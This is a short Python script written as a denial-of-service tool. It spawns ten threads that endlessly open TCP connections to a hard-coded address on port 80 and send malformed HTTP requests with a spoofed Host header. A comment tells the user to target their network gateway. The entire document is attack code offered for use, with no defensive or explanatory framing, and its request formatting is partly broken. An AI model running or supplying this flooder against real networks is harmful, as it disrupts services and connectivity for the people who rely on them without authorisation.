import socket 
import threading
# write ipconfig in CMD and copy the gateway


TARGET = '10.135.102.5'
PORT = 80
ADDR = (TARGET, PORT)
FAKE_IP = '12.15.230.25'

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(ADDR)
        s.sendto(('GET /' + TARGET + 'HTTP/1.1\r\n').encode('ascii'), ADDR)
        s.sendto(('HOST: '+ FAKE_IP + '\r\r\r\n').encode('ascii'), ADDR)
        s.close()
        
for i in range(10):
    thread = threading.Thread(target = attack)
    thread.start()